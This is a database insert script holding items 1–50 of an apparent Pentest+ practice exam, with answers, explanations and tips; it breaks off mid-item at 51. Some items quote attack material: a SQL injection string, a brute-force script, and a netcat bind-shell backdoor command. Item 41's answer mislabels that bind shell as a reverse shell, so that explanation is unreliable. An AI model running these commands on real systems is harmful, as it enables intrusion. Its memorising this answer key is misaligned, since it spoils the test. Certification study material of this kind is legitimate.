db.tests.insertOne({
  "category": "penplus",
  "testId": 3,
  "testName": "Pentest+ Practice Test #3 (Easy)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "You are reviewing a web server log after a penetration test and notice the following entry:\n\n```\n192.168.1.10 - - [23/Feb/2025:10:12:45 -0500] \"GET /index.php?id=1' OR '1'='1' -- HTTP/1.1\" 200 5123\n```\n\nWhat potential vulnerability is being exploited based on this log entry?",
      "options": [
        "Cross-Site Scripting (XSS)",
        "SQL Injection",
        "Command Injection",
        "Directory Traversal"
      ],
      "correctAnswerIndex": 1,
      "explanation": "SQL Injection is correct because the `id=1' OR '1'='1' --` syntax suggests an attempt to manipulate a SQL query. XSS is incorrect because there is no evidence of JavaScript payloads. Command Injection is incorrect as this does not involve system commands. Directory Traversal is incorrect since there are no `../` sequences.",
      "examTip": "Always check for user input being passed into database queries without proper sanitization."
    },
    {
      "id": 2,
      "question": "Which of the following is the MOST effective method to prevent credential stuffing attacks against a web application?",
      "options": [
        "Implementing a password complexity policy",
        "Requiring users to reset passwords periodically",
        "Enforcing account lockouts after failed login attempts",
        "Using multi-factor authentication (MFA)"
      ],
      "correctAnswerIndex": 3,
      "explanation": "MFA is correct because it prevents attackers from successfully logging in even if they have valid credentials. Password complexity policies do not stop credential stuffing since attackers use real, leaked credentials. Password resets may help but do not address the root cause. Account lockouts can slow attacks but may lead to denial-of-service against legitimate users.",
      "examTip": "MFA is the strongest defense against credential stuffing since it requires a second factor beyond passwords."
    },
    {
      "id": 3,
      "question": "Review the following Python script used for reconnaissance:\n\n```python\nimport requests\nurl = \"http://target.com/login\"\ndata = {\"username\": \"admin\", \"password\": \"password123\"}\nresponse = requests.post(url, data=data)\nif \"Welcome\" in response.text:\n    print(\"Login successful!\")\nelse:\n    print(\"Login failed.\")\n```\n\nWhich modification would make this script more effective for brute-force testing?",
      "options": [
        "Using a proxy to route requests through Tor",
        "Randomizing user-agent strings for each request",
        "Adding a delay between requests to avoid detection",
        "Iterating through a wordlist of passwords instead of using a static one"
      ],
      "correctAnswerIndex": 3,
      "explanation": "Iterating through a wordlist is correct because brute-force testing requires multiple password attempts. Using Tor helps anonymization but does not improve effectiveness. Randomizing user-agents can help avoid detection but does not enhance brute-force functionality. Adding delays may bypass rate-limiting but slows down attacks.",
      "examTip": "Brute-force tools rely on iterating through password lists; a static password limits effectiveness."
    },
    {
      "id": 4,
      "question": "You have been authorized to perform a penetration test on a clientâ€™s internal network. What is the FIRST step you should take before beginning active reconnaissance?",
      "options": [
        "Run a full Nmap scan on all devices in the network",
        "Review the statement of work (SoW) and rules of engagement",
        "Exploit known vulnerabilities on exposed services",
        "Enumerate user credentials via open-source intelligence (OSINT)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Reviewing the SoW is correct because it ensures you understand scope, legal boundaries, and limitations. Running an Nmap scan too early could be unauthorized or outside the agreed scope. Exploiting vulnerabilities before reconnaissance is premature and unethical. OSINT is useful, but verifying authorization takes precedence.",
      "examTip": "Always confirm scope and legal permissions before starting active testing."
    },
    {
      "id": 5,
      "question": "During an internal penetration test, you gain access to a Windows machine with local administrator privileges. Your goal is to move laterally to other systems. Which of the following tactics would be the BEST choice to accomplish this?",
      "options": [
        "Exploiting an SMB relay attack using Responder",
        "Running an Nmap scan to find vulnerable hosts",
        "Using Mimikatz to extract credentials from memory",
        "Modifying the hosts file to redirect network traffic"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Mimikatz is correct because it allows you to steal credentials and use them for lateral movement. SMB relay attacks may work but require specific network conditions. Scanning for vulnerabilities is useful but does not directly allow lateral movement. Modifying the hosts file does not assist in credential-based movement.",
      "examTip": "Credential dumping is a primary technique for lateral movement in penetration tests."
    },
    {
      "id": 6,
      "question": "Which of the following tools would be MOST appropriate for extracting credentials from memory on a compromised Windows system?",
      "options": [
        "Wireshark",
        "Metasploit",
        "Mimikatz",
        "Burp Suite"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Mimikatz is correct because it can extract credentials from Windows memory. Wireshark is incorrect since it captures network traffic but does not extract credentials from memory. Metasploit is a powerful framework but not specifically designed for this task. Burp Suite is used for web application security testing, not memory credential extraction.",
      "examTip": "Mimikatz is commonly used for credential extraction in penetration tests."
    },
    {
      "id": 7,
      "question": "Which of the following attack types would be MOST effective against an incorrectly configured Web Application Firewall (WAF)?",
      "options": [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "Web Parameter Tampering",
        "Payload Encoding to Bypass Filtering"
      ],
      "correctAnswerIndex": 3,
      "explanation": "Payload encoding is correct because it can evade poorly configured WAF rules. SQL Injection and XSS may still be blocked if WAF rules are properly set. Web Parameter Tampering is a valid attack but does not specifically target WAF bypassing.",
      "examTip": "Payload encoding and obfuscation techniques can help bypass poorly configured WAFs."
    },
    {
      "id": 8,
      "question": "Review this Nmap command: `nmap -sV -O -p 1-1000 192.168.1.1`\nWhat is the purpose of the `-sV` option?",
      "options": [
        "Perform a stealth scan.",
        "Perform service and version detection.",
        "Scan only UDP ports.",
        "Perform OS detection."
      ],
      "correctAnswerIndex": 1,
      "explanation": "-sV enables service version detection, attempting to determine the specific software and version running on open ports. -sS is a stealth scan, -sU is for UDP, and -O is for OS detection (which is also included in this command).",
      "examTip": "-sV = Service version detection (Nmap)."
    },
    {
      "id": 9,
      "question": "You are tasked with testing the security of a RESTful API. Which tool would be MOST appropriate?",
      "options": [
        "Nmap",
        "Postman",
        "Wireshark",
        "Aircrack-ng"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Postman is designed for interacting with and testing APIs, allowing you to craft custom requests and analyze responses. Nmap is for port scanning, Wireshark is for traffic analysis, and Aircrack-ng is for Wi-Fi security testing.",
      "examTip": "Postman = API testing tool."
    },
    {
      "id": 10,
      "question": "Analyze the following Apache web server log snippet:\n```\n192.168.1.100 - - [25/Aug/2024:14:32:15 -0400] \"GET /admin.php HTTP/1.1\" 404 208 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n```\nWhat does the '404' status code indicate?",
      "options": [
        "The request was successful.",
        "The requested resource was not found.",
        "The server encountered an internal error.",
        "The client is not authorized to access the resource."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A 404 status code specifically means 'Not Found' - the server couldn't find the requested resource (/admin.php in this case). 200 is success, 500 is internal server error, and 401/403 are authorization-related.",
      "examTip": "404 = Not Found (HTTP status code)."
    }, 
    {
      "id": 11,
      "question": "During a penetration test, you discover an internal web application that allows users to submit feedback. The input field accepts HTML and JavaScript. What attack type is the application MOST vulnerable to?",
      "options": [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "Command Injection",
        "Server-Side Request Forgery (SSRF)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "XSS is correct because the application allows JavaScript input, which can be used to inject malicious scripts. SQL Injection involves database queries, not JavaScript. Command Injection manipulates system commands, and SSRF exploits server-side web requests.",
      "examTip": "Always sanitize user input to prevent JavaScript execution in web applications."
    },
    {
      "id": 12,
      "question": "You are performing an Nmap scan on a clientâ€™s network and receive the following result:\n\n```\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n80/tcp   open     http\n443/tcp  open     https\n3306/tcp open     mysql\n```\n\nBased on this output, what is the BEST next step?",
      "options": [
        "Attempt a brute-force attack on SSH",
        "Check for default credentials on MySQL",
        "Perform a directory brute-force attack on HTTP",
        "Analyze SSL/TLS configurations for vulnerabilities"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Checking for default credentials on MySQL is correct because databases often have weak or default passwords. Brute-forcing SSH is noisy and may trigger security alerts. Directory brute-forcing is useful, but MySQL misconfiguration is a more immediate target. Analyzing SSL/TLS is valid but does not directly exploit the open MySQL port.",
      "examTip": "Databases with default credentials are common security risks. Always check for weak or default passwords."
    },
    {
      "id": 13,
      "question": "Which technique would BEST allow an attacker to maintain access to a compromised Windows system even after a reboot?",
      "options": [
        "Creating a scheduled task",
        "Executing a reverse shell",
        "Extracting user credentials",
        "Performing an SMB relay attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Creating a scheduled task is correct because it allows persistence even after a reboot. A reverse shell grants access but does not persist through restarts. Extracting credentials helps lateral movement but does not establish persistence. An SMB relay attack is a one-time exploitation method.",
      "examTip": "Scheduled tasks and registry modifications are common persistence techniques."
    },
    {
      "id": 14,
      "question": "A penetration tester needs to discover all live hosts on a network without triggering security alerts. Which tool would be the BEST choice?",
      "options": [
        "Nmap with aggressive scanning enabled",
        "ICMP ping sweep",
        "ARP scanning",
        "Brute-force SSH login attempts"
      ],
      "correctAnswerIndex": 2,
      "explanation": "ARP scanning is correct because it does not rely on ping responses, which may be blocked. ICMP ping sweeps can be detected and blocked. Aggressive Nmap scans are noisy and likely to trigger alerts. Brute-force SSH is highly detectable and unrelated to host discovery.",
      "examTip": "Use ARP scanning for stealthy host discovery on local networks."
    },
    {
      "id": 15,
      "question": "Which of the following attack techniques is MOST effective for bypassing multifactor authentication (MFA)?",
      "options": [
        "Pass-the-hash attack",
        "Credential stuffing",
        "MFA fatigue attack",
        "Brute-force login attempts"
      ],
      "correctAnswerIndex": 2,
      "explanation": "MFA fatigue attacks are correct because they exploit users by bombarding them with authentication requests until they approve access. Pass-the-hash and credential stuffing do not bypass MFA directly. Brute-force attempts are ineffective against MFA-protected accounts.",
      "examTip": "MFA fatigue attacks manipulate users rather than exploiting technical vulnerabilities."
    },
    {
      "id": 16,
      "question": "Which of the following BEST describes the role of a web application firewall (WAF) in penetration testing?",
      "options": [
        "To prevent attackers from exploiting known vulnerabilities",
        "To detect and block malicious HTTP traffic",
        "To replace the need for secure coding practices",
        "To monitor internal network traffic for anomalies"
      ],
      "correctAnswerIndex": 1,
      "explanation": "A WAF is correct because it analyzes and filters HTTP traffic to block attacks. It does not replace secure coding (option 3). Preventing known vulnerabilities (option 1) depends on the configuration, and monitoring internal traffic (option 4) is more of an IDS/IPS function.",
      "examTip": "WAFs help mitigate web-based attacks but are not a substitute for secure development practices."
    },
    {
      "id": 17,
      "question": "Which payload encoding technique is MOST effective for bypassing signature-based intrusion detection systems (IDS)?",
      "options": [
        "Base64 encoding",
        "URL encoding",
        "Hex encoding",
        "Polymorphic shellcode"
      ],
      "correctAnswerIndex": 3,
      "explanation": "Polymorphic shellcode is correct because it continuously changes its structure while maintaining functionality, making it harder to detect. Base64, URL, and Hex encoding can be useful but are easier to recognize by IDS signatures.",
      "examTip": "Polymorphic and obfuscated payloads can evade detection more effectively than simple encoding."
    },
    {
      "id": 18,
      "question": "During a web application penetration test, you intercept an HTTP request containing the following header:\n\n```\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\n```\n\nWhat is the MOST likely security issue?",
      "options": [
        "The application is using a weak hash algorithm",
        "Credentials are transmitted in plaintext",
        "The application is vulnerable to CSRF attacks",
        "The session token is improperly stored"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Basic authentication encodes credentials in Base64, which is easily reversible, leading to plaintext credential exposure. Weak hash algorithms relate to password storage, not transmission. CSRF is unrelated, and session token storage does not apply here.",
      "examTip": "Basic authentication should be replaced with more secure authentication methods like OAuth or token-based authentication."
    },
    {
      "id": 19,
      "question": "A penetration tester is attempting to crack a Windows NTLM hash using a wordlist. Which of the following tools would be the BEST choice?",
      "options": [
        "John the Ripper",
        "sqlmap",
        "Burp Suite",
        "Wireshark"
      ],
      "correctAnswerIndex": 0,
      "explanation": "John the Ripper is correct because it is a widely used password cracking tool supporting NTLM hashes. sqlmap is used for SQL Injection, Burp Suite is for web application testing, and Wireshark is a packet analyzer.",
      "examTip": "Use John the Ripper or Hashcat for cracking NTLM hashes efficiently."
    },
    {
      "id": 20,
      "question": "Which of the following vulnerabilities would MOST likely allow an attacker to gain unauthorized access to a cloud environment?",
      "options": [
        "Open database ports",
        "Overly permissive IAM roles",
        "Unpatched web application",
        "Weak SSL/TLS configurations"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Overly permissive IAM roles are correct because they can allow unauthorized access to cloud resources. Open database ports and unpatched applications are serious but require further exploitation. Weak SSL/TLS primarily affects data confidentiality rather than access control.",
      "examTip": "Always follow the principle of least privilege when configuring IAM roles in cloud environments."
    },
    {
      "id": 21,
      "question": "A penetration tester is conducting a network assessment and captures the following packet:\n\n```\nFrame 1: 60 bytes on wire\nEthernet II, Src: 00:14:22:01:23:45, Dst: 08:00:27:1a:2b:3c\nInternet Protocol Version 4, Src: 192.168.1.10, Dst: 192.168.1.20\nTransmission Control Protocol, Src Port: 139, Dst Port: 445\nSMB Protocol: Negotiate Protocol Request\n```\n\nWhat is the MOST likely goal of this network activity?",
      "options": [
        "Enumerating shared resources",
        "Performing a DNS zone transfer",
        "Executing a buffer overflow attack",
        "Launching an ICMP flood attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Enumerating shared resources is correct because SMB (port 445) is commonly used for file sharing and resource discovery. DNS zone transfers (option 2) use TCP 53, not SMB. Buffer overflow attacks may target services but aren't indicated by this packet. ICMP flood attacks are unrelated to SMB traffic.",
      "examTip": "SMB enumeration is a common first step in internal network reconnaissance."
    },
    {
      "id": 22,
      "question": "Which of the following techniques would BEST evade detection when exfiltrating data from a compromised host?",
      "options": [
        "Sending data over HTTP requests",
        "Encoding data in DNS queries",
        "Uploading files to a public file-sharing site",
        "Sending emails with encrypted attachments"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Encoding data in DNS queries is correct because DNS traffic is often overlooked by security tools. Sending data over HTTP may be blocked or monitored. Uploading to a public site is detectable. Sending encrypted attachments may raise suspicion but isn't as stealthy as DNS tunneling.",
      "examTip": "DNS tunneling is a stealthy method for data exfiltration in restricted environments."
    },
    {
      "id": 23,
      "question": "Which of the following Nmap commands would provide the MOST detailed information about open ports and running services on a target host?",
      "options": [
        "`nmap -sP target`",
        "`nmap -O target`",
        "`nmap -sS -sV target`",
        "`nmap -A target`"
      ],
      "correctAnswerIndex": 3,
      "explanation": "`nmap -A target` is correct because it enables service detection (`-sV`), OS detection (`-O`), and script scanning. `-sP` only checks if a host is online. `-O` is OS detection but does not include service scanning. `-sS -sV` performs a SYN scan and version detection but lacks OS detection and scripts.",
      "examTip": "Use `nmap -A` for the most comprehensive scan, but be aware it may trigger security alerts."
    },
    {
      "id": 24,
      "question": "A penetration tester intercepts a request to a web application containing the following parameter:\n\n```\nGET /profile?id=123 HTTP/1.1\nHost: target.com\nCookie: sessionid=xyz123;\n```\n\nWhich attack is MOST likely to succeed if the tester modifies the `id` value?",
      "options": [
        "Cross-Site Request Forgery (CSRF)",
        "Insecure Direct Object Reference (IDOR)",
        "Session Fixation",
        "Clickjacking"
      ],
      "correctAnswerIndex": 1,
      "explanation": "IDOR is correct because modifying the `id` parameter may allow unauthorized access to other user profiles. CSRF requires user interaction and is unrelated here. Session fixation involves manipulating session tokens, not ID parameters. Clickjacking involves UI manipulation, not parameter tampering.",
      "examTip": "IDOR vulnerabilities often arise from missing access controls on user-modifiable parameters."
    },
    {
      "id": 25,
      "question": "Which of the following tools is BEST suited for performing OSINT (Open-Source Intelligence) reconnaissance on a target?",
      "options": [
        "sqlmap",
        "theHarvester",
        "Nmap",
        "Metasploit"
      ],
      "correctAnswerIndex": 1,
      "explanation": "theHarvester is correct because it gathers emails, subdomains, and public data. sqlmap is for SQL injection testing. Nmap is for network scanning. Metasploit is an exploitation framework, not an OSINT tool.",
      "examTip": "OSINT tools like theHarvester help gather intelligence before launching active tests."
    },
    {
      "id": 26,
      "question": "Which method is the MOST effective for escalating privileges on a compromised Linux system?",
      "options": [
        "Running a brute-force attack on the root user",
        "Exploiting a misconfigured SUID binary",
        "Sniffing unencrypted network traffic",
        "Performing an SSH login attempt with default credentials"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Exploiting a misconfigured SUID binary is correct because it can allow privilege escalation. Brute-forcing the root user is highly detectable and unlikely to succeed. Sniffing traffic can gather credentials but does not escalate privileges directly. SSH login with default credentials is a valid attack but does not guarantee root access.",
      "examTip": "Misconfigured SUID binaries can allow privilege escalation; always check for them during testing."
    },
    {
      "id": 27,
      "question": "A penetration tester successfully exploits a web server and wants to establish a persistent backdoor. Which of the following methods would be the MOST effective?",
      "options": [
        "Uploading a web shell to the server",
        "Running a one-time reverse shell",
        "Performing a denial-of-service attack",
        "Enumerating the systemâ€™s user accounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Uploading a web shell is correct because it provides continuous access. A one-time reverse shell does not persist after the connection is closed. A denial-of-service attack does not establish persistence. Enumerating user accounts is useful but does not ensure long-term access.",
      "examTip": "Web shells provide attackers with persistent access and remote control over compromised servers."
    },
    {
      "id": 28,
      "question": "Which of the following describes the PRIMARY purpose of a command and control (C2) framework in penetration testing?",
      "options": [
        "To exfiltrate sensitive data from a compromised system",
        "To establish persistent access to a compromised host",
        "To perform OS fingerprinting on target machines",
        "To execute denial-of-service attacks on remote systems"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Establishing persistent access is correct because C2 frameworks allow remote control of compromised hosts. Exfiltrating data is a function but not the primary purpose. OS fingerprinting and DoS attacks are unrelated to C2 frameworks.",
      "examTip": "C2 frameworks like Cobalt Strike and Metasploit enable attackers to maintain long-term access."
    },
    {
      "id": 29,
      "question": "Which payload technique is the MOST effective for bypassing traditional antivirus detection?",
      "options": [
        "Using a known Metasploit payload",
        "Encoding payloads in Base64",
        "Employing process injection techniques",
        "Deploying a plaintext reverse shell"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Process injection techniques are correct because they allow payloads to execute within legitimate processes, evading detection. Known Metasploit payloads are likely detected. Base64 encoding can be reversed. Plaintext reverse shells are easy to detect.",
      "examTip": "Process injection helps evade detection by running malicious code inside trusted processes."
    },
    {
      "id": 30,
      "question": "Which of the following would be the BEST method to test for password reuse across multiple web applications?",
      "options": [
        "Conducting a phishing attack",
        "Using a credential stuffing attack",
        "Performing an SQL injection",
        "Intercepting HTTP traffic with a proxy"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Credential stuffing is correct because it automates login attempts with known credentials. Phishing gathers credentials but does not test reuse. SQL injection exploits database flaws. Intercepting HTTP traffic captures logins but does not test reuse.",
      "examTip": "Credential stuffing attacks leverage leaked passwords to compromise multiple accounts."
    },
    {
      "id": 31,
      "question": "A penetration tester discovers that an internal web application stores passwords in plaintext in a database. What immediate risk does this pose?",
      "options": [
        "Passwords can be easily retrieved if the database is compromised.",
        "The web application may be vulnerable to SQL injection.",
        "Attackers can execute arbitrary system commands through the login form.",
        "The application might expose passwords in browser cookies."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Passwords stored in plaintext can be directly retrieved if the database is compromised. SQL injection, while a serious risk, does not necessarily imply plaintext password storage. Command execution through login is unrelated to this issue. Passwords in browser cookies are a separate security concern.",
      "examTip": "Always store passwords using strong cryptographic hashing methods, such as bcrypt or Argon2."
    },
    {
      "id": 32,
      "question": "Which command would allow a penetration tester to discover all shared folders on a target Windows machine?",
      "options": [
        "`nmap --script smb-enum-shares -p445 target_ip`",
        "`netstat -an | findstr LISTEN`",
        "`nc -lvp 445`",
        "`arp -a`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nmap --script smb-enum-shares -p445 target_ip` command correctly enumerates SMB shares. `netstat -an` shows open ports but not shares. `nc -lvp 445` sets up a listener but does not enumerate shares. `arp -a` lists ARP cache entries but does not provide SMB information.",
      "examTip": "Use Nmap scripts for service enumeration, such as `smb-enum-shares` for SMB share discovery."
    },
    {
      "id": 33,
      "question": "During a web application test, you intercept the following response header:\n\n```\nSet-Cookie: sessionid=abcd1234; HttpOnly; Secure;\n```\n\nWhich security feature is enforced by this configuration?",
      "options": [
        "The cookie cannot be accessed via JavaScript.",
        "The cookie is encrypted using TLS.",
        "The cookie can only be set once per session.",
        "The cookie prevents SQL injection attacks."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`HttpOnly` prevents JavaScript from accessing the cookie, mitigating XSS risks. `Secure` ensures transmission over HTTPS but does not encrypt the cookie itself. Cookies are not restricted to single use per session. SQL injection protection is unrelated to cookie flags.",
      "examTip": "HttpOnly cookies help prevent XSS-related session theft by restricting JavaScript access."
    },
    {
      "id": 34,
      "question": "Which of the following is an example of a time-based one-time password (TOTP) algorithm?",
      "options": [
        "SHA-256",
        "HMAC-SHA1",
        "bcrypt",
        "MD5"
      ],
      "correctAnswerIndex": 1,
      "explanation": "HMAC-SHA1 is used in TOTP algorithms for generating time-based one-time passwords. SHA-256 and MD5 are general hashing algorithms, while bcrypt is a password hashing function.",
      "examTip": "TOTP authentication uses HMAC-based algorithms to generate temporary access codes."
    },
    {
      "id": 35,
      "question": "A penetration tester is reviewing a system's network connections and sees a large number of outbound requests to `1.1.1.1` using DNS over HTTPS (DoH). What is the MOST likely reason for this?",
      "options": [
        "The system is bypassing DNS filtering by using an encrypted tunnel.",
        "The system is attempting to brute-force a DNS resolver.",
        "The system is vulnerable to a DNS rebinding attack.",
        "The system is using a misconfigured DNS cache."
      ],
      "correctAnswerIndex": 0,
      "explanation": "DNS over HTTPS encrypts DNS queries, allowing systems to bypass traditional DNS filtering. Brute-forcing DNS resolvers is uncommon. DNS rebinding does not involve encrypted outbound queries. A misconfigured DNS cache would not generate consistent encrypted traffic.",
      "examTip": "DNS over HTTPS (DoH) can be used for both privacy and evasion from network-based monitoring."
    },
    {
      "id": 36,
      "question": "Which of the following is a common indicator of a Kerberoasting attack?",
      "options": [
        "Excessive failed login attempts from multiple IP addresses",
        "Unusual LDAP queries for sensitive user accounts",
        "Service ticket requests for high-privileged accounts",
        "Repeated password reset requests from a single source"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Kerberoasting involves requesting service tickets for high-privileged accounts to extract encrypted credentials. Failed logins indicate brute-force attempts. Unusual LDAP queries may indicate reconnaissance but not Kerberoasting. Password reset abuse is unrelated.",
      "examTip": "Monitor for unusual Kerberos service ticket requests to detect Kerberoasting attempts."
    },
    {
      "id": 37,
      "question": "Which type of wireless attack involves setting up a rogue access point with the same SSID as a legitimate network?",
      "options": [
        "Evil Twin attack",
        "Deauthentication attack",
        "Beacon flooding attack",
        "Replay attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "An Evil Twin attack involves setting up a rogue access point to trick users into connecting. Deauthentication attacks disconnect users but do not involve rogue APs. Beacon flooding creates excessive SSID beacons but does not clone a real network. Replay attacks involve resending captured packets.",
      "examTip": "Evil Twin attacks rely on user deception to steal credentials and intercept traffic."
    },
    {
      "id": 38,
      "question": "A penetration tester is using a tool to extract password hashes from a Windows machine. Which file is MOST likely being accessed?",
      "options": [
        "`/etc/shadow`",
        "`SAM`",
        "`passwd`",
        "`NTUSER.dat`"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `SAM` file stores Windows password hashes. `/etc/shadow` is used on Linux. `passwd` contains user information but not hashes. `NTUSER.dat` stores user profile settings.",
      "examTip": "Windows credentials are stored in the `SAM` file and can be extracted using tools like Mimikatz."
    },
    {
      "id": 39,
      "question": "Which tool is commonly used for privilege escalation on Linux by exploiting misconfigured SUID binaries?",
      "options": [
        "LinPEAS",
        "Nikto",
        "John the Ripper",
        "sqlmap"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LinPEAS is correct because it identifies privilege escalation vectors, including SUID misconfigurations. Nikto is a web scanner. John the Ripper is a password cracker. sqlmap is used for SQL injection testing.",
      "examTip": "Use LinPEAS to automate privilege escalation enumeration on Linux systems."
    },
    {
      "id": 40,
      "question": "Which technique is used by attackers to inject malicious code into memory without leaving artifacts on disk?",
      "options": [
        "Process hollowing",
        "DLL hijacking",
        "Session fixation",
        "DNS tunneling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Process hollowing is correct because it involves injecting malicious code into a legitimate process without writing to disk. DLL hijacking exploits DLL search order but does not directly avoid disk artifacts. Session fixation manipulates authentication tokens. DNS tunneling is used for covert communication, not code injection.",
      "examTip": "Memory injection techniques like process hollowing help attackers evade antivirus detection."
    },
    {
      "id": 41,
      "question": "A penetration tester executes the following command:\n\n```\necho 'nc -lvnp 4444 -e /bin/bash' > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh\n```\n\nWhat is the primary purpose of this script?",
      "options": [
        "To scan the local network for open ports",
        "To set up a reverse shell listener",
        "To brute-force user credentials",
        "To generate an SSH key pair"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The script creates a Netcat listener (`nc -lvnp 4444`) that executes `/bin/bash`, allowing an attacker to establish a reverse shell. Scanning for open ports and brute-forcing credentials are unrelated. Generating an SSH key pair does not involve Netcat.",
      "examTip": "Reverse shells allow attackers to remotely execute commands on a compromised system."
    },
    {
      "id": 42,
      "question": "Which of the following BEST describes an attacker capturing and replaying authentication requests to gain unauthorized access?",
      "options": [
        "Pass-the-hash attack",
        "Replay attack",
        "Man-in-the-middle attack",
        "Brute-force attack"
      ],
      "correctAnswerIndex": 1,
      "explanation": "A replay attack involves capturing and reusing authentication requests to gain access. Pass-the-hash attacks use stolen NTLM hashes. Man-in-the-middle attacks intercept and alter communication. Brute-force attacks involve guessing credentials.",
      "examTip": "Use session tokens with timestamps and nonce values to prevent replay attacks."
    },
    {
      "id": 43,
      "question": "A penetration tester is conducting an external assessment and uses the following command:\n\n```\nnslookup -type=ANY example.com\n```\n\nWhat information is the tester attempting to gather?",
      "options": [
        "Publicly available DNS records",
        "Open ports on the target domain",
        "Subdomain enumeration results",
        "TLS/SSL certificate details"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`nslookup -type=ANY` retrieves all available DNS records for a given domain, such as MX, A, and TXT records. It does not scan open ports, enumerate subdomains, or provide TLS/SSL details.",
      "examTip": "Querying DNS records can reveal valuable information such as mail servers and SPF settings."
    },
    {
      "id": 44,
      "question": "Which attack technique abuses the Windows `rundll32.exe` process to execute malicious payloads?",
      "options": [
        "DLL sideloading",
        "Process injection",
        "Living off the land (LOLBins)",
        "Heap spraying"
      ],
      "correctAnswerIndex": 2,
      "explanation": "`rundll32.exe` is a LOLBin that attackers use to execute malicious DLLs. DLL sideloading exploits how Windows searches for DLLs. Process injection involves injecting malicious code into legitimate processes. Heap spraying is used to exploit memory vulnerabilities.",
      "examTip": "LOLBins like `rundll32.exe` allow attackers to execute malicious code while blending in with normal system activity."
    },
    {
      "id": 45,
      "question": "Which of the following vulnerabilities is MOST likely present if a web application does not properly sanitize user input before executing system commands?",
      "options": [
        "SQL Injection",
        "Command Injection",
        "Cross-Site Scripting (XSS)",
        "Insecure Deserialization"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Command Injection is correct because unsanitized input allows attackers to execute system commands. SQL Injection manipulates database queries. XSS targets client-side scripts. Insecure Deserialization affects object handling.",
      "examTip": "Sanitize user input to prevent direct execution of system commands by web applications."
    },
    {
      "id": 46,
      "question": "A penetration tester discovers an exposed administrative login page for a web application. Which of the following actions would be the MOST appropriate next step?",
      "options": [
        "Attempt a brute-force attack on the login page",
        "Enumerate valid usernames using error messages",
        "Check for default credentials",
        "Modify cookies to escalate privileges"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Checking for default credentials is the safest and least intrusive first step. Brute-forcing can trigger account lockouts. Username enumeration can help, but default credentials provide immediate access. Modifying cookies without authentication is unlikely to escalate privileges.",
      "examTip": "Always check for default credentials before attempting more aggressive techniques."
    },
    {
      "id": 47,
      "question": "Which of the following tools is commonly used to analyze network traffic and detect suspicious activity?",
      "options": [
        "Metasploit",
        "Mimikatz",
        "Wireshark",
        "sqlmap"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Wireshark is a network traffic analyzer used to detect anomalies. Metasploit is an exploitation framework. Mimikatz extracts credentials from Windows memory. sqlmap automates SQL injection attacks.",
      "examTip": "Wireshark is essential for analyzing network traffic and identifying security threats."
    },
    {
      "id": 48,
      "question": "Which of the following commands would allow a penetration tester to determine the version of an SSH service running on a target host?",
      "options": [
        "`nmap -p 22 --script ssh-hostkey target`",
        "`nmap -sV -p 22 target`",
        "`ssh -v target`",
        "`telnet target 22`"
      ],
      "correctAnswerIndex": 1,
      "explanation": "`nmap -sV -p 22 target` is correct because it detects service versions. `ssh -v` enables verbose mode for SSH connections but does not enumerate service versions. `telnet` may return a banner but does not perform version detection.",
      "examTip": "Use `nmap -sV` to enumerate service versions for better attack surface mapping."
    },
    {
      "id": 49,
      "question": "Which of the following authentication protocols is considered the MOST secure for protecting against credential theft?",
      "options": [
        "NTLM",
        "Kerberos",
        "Basic Authentication",
        "Digest Authentication"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Kerberos is correct because it uses ticket-based authentication, reducing credential exposure. NTLM is outdated and vulnerable to relay attacks. Basic Authentication transmits credentials in Base64 encoding. Digest Authentication improves security but is less robust than Kerberos.",
      "examTip": "Kerberos reduces credential exposure by using ticket-based authentication instead of transmitting passwords."
    },
    {
      "id": 50,
      "question": "A penetration tester captures the following HTTP request:\n\n```\nPOST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin123\n```\n\nWhich of the following is the MOST significant security issue with this request?",
      "options": [
        "The credentials are transmitted in plaintext.",
        "The request uses an insecure authentication method.",
        "The application does not use multi-factor authentication (MFA).",
        "The username and password are easily guessable."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Transmitting credentials in plaintext is the biggest issue because attackers can intercept them. The authentication method is insecure but less critical than plaintext transmission. MFA is missing, but plaintext transmission is the primary flaw. Weak credentials are an issue but secondary to plaintext exposure.",
      "examTip": "Always use HTTPS to encrypt authentication data and prevent credential theft."
    },
    {
      "id": 51,
      "question": "A penetration tester successfully exploits a Linux web server and gains a low-privileged shell. Which of the following commands would be MOST useful for checking SUID binaries that could lead to privilege escalation?",
      "options": [
